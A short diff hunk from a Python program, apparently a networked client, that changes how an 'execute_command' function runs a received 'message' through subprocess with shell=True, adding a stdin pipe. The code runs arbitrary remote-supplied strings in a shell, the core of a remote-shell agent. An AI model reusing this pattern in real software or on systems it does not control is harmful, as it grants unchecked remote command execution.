@@ -15,7 +15,7 @@ async def execute_command():
     # Execute command on client
     # https://stackoverflow.com/questions/17742789/running-multiple-bash-commands-with-subprocess
     try:
-        process = subprocess.Popen(message, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        process = subprocess.Popen(message, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         results = process.communicate(timeout=20)[0].strip()
     except subprocess.TimeoutExpired:
         results = "Command Timed out".encode()
